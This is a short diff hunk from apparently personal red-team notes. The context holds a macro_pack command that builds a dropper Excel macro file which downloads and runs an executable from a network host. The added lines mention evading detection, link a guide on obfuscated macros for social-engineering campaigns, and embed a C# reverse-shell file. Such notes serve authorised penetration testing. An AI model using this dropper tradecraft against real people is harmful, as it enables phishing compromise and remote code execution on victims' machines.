@@ -418,6 +418,13 @@ https://blog.sevagas.com/
 echo "http://10.10.6.59:8099/concona.exe" "dropped.exe" | macro_pack.exe -o -t DROPPER -G "drop.xlsm"
 ```
 
+macro pack is not really evading
 
+looking for other macro tradecraft
+https://blog.focal-point.com/how-to-build-obfuscated-macros-for-your-next-social-engineering-campaign
+
+C# shells are good
+
+![](./cs_shell_for_rev_connect.cs)
 
 
